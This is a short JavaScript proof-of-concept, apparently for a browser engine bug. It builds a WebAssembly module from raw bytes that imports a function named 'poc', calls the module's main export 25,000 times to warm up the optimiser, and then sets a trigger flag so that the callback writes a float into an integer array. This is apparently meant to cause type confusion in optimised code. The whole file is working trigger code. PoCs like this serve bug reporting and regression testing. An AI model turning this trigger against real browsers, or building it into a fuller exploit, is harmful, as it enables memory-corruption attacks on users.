let trigger = false;

function poc(p1, p2, p3) {
    if (trigger) {
        p1[0] = 1.1;
    }
}

const wasm_code = new Uint8Array([
    0x00, 0x61, 0x73, 0x6d, 0x01, 0x00, 0x00, 0x00, 0x01, 0x08, 0x01, 0x60,
    0x03, 0x6f, 0x6f, 0x6f, 0x00, 0x00, 0x02, 0x0b, 0x01, 0x03, 0x65, 0x6e,
    0x76, 0x03, 0x70, 0x6f, 0x63, 0x00, 0x00, 0x03, 0x02, 0x01, 0x00, 0x07,
    0x08, 0x01, 0x04, 0x6d, 0x61, 0x69, 0x6e, 0x00, 0x00, 0x0a, 0x2e, 0x01,
    0x2c, 0x01, 0x01, 0x6f, 0x20, 0x00, 0x20, 0x01, 0x20, 0x02, 0x03, 0x40,
    0x03, 0x6f, 0x6f, 0x6f, 0x20, 0x03, 0x41, 0x01, 0x73, 0x04, 0x20, 0x04,
    0x20, 0x05, 0x20, 0x06, 0x10, 0x00, 0x0b, 0x20, 0x03, 0x41, 0x01, 0x6a,
    0x21, 0x03, 0x20, 0x03, 0x41, 0x02, 0x4d, 0x20, 0x05, 0x20, 0x04, 0x20,
    0x05, 0x0d, 0x00, 0x0b
]);

const wasm_module = new WebAssembly.Module(wasm_code);
const instance = new WebAssembly.Instance(wasm_module, { env: { poc } });
const main = instance.exports.main;

let o1 = [1, 2, 3];
let o2 = [1.1, 2.2, 3.3];
let o3 = {};

for (let i = 0; i < 25000; ++i) {
    main(o1, o2, o3);
}

trigger = true;
main(o1, o2, o3);